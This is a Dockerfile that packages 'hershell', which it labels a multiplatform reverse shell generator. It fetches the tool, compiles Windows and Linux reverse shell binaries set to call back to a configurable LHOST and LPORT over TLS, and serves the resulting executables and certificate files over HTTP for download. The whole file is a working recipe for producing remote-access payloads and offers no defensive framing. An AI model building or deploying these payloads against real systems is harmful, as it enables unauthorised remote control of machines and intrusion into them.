# # 
# Build for both archs. Binaries use the same TLS cert. Cert/key are exported to the bin dir for easy fetch
# Easily download results from the container by running it and browsing to its port 8000
# docker run -it -p "8000:8000" hershell:latest

FROM golang:alpine

LABEL name hershell
LABEL src "https://github.com/lesnuages/hershell"
LABEL creator lesnuages
LABEL dockerfile_maintenance khast3x
LABEL desc "Multiplatform reverse shell generator"

RUN apk add --update make git openssl \
    && go get github.com/lesnuages/hershell \
    && go get -u github.com/fogleman/serve
WORKDIR /go/src/github.com/lesnuages/hershell/

ARG LHOST=127.0.0.1
ARG LPORT=8080
ARG GOARCH=64

# #
# Ensure the key and pem files are located in "./cert/"
# To build with your own certificate, uncomment below 
# COPY ./cert/* /go/src/github.com/lesnuages/hershell/
# RUN make windows${GOARCH} LHOST=${LHOST} LPORT=${LPORT} \
#     && make linux${GOARCH} LHOST=${LHOST} LPORT=${LPORT} \
#     && cp *.exe /go/bin/ 
# #


# #
# To generate a certificate at build time, uncomment below
# Comment below to use your own certificate
RUN make depends && make windows${GOARCH} LHOST=${LHOST} LPORT=${LPORT} \
    && make linux${GOARCH} LHOST=${LHOST} LPORT=${LPORT} \
    && cp server.key server.pem *.exe /go/bin/ 
# #

EXPOSE 8000
ENTRYPOINT [ "serve", "-dir", "/go/bin/"]
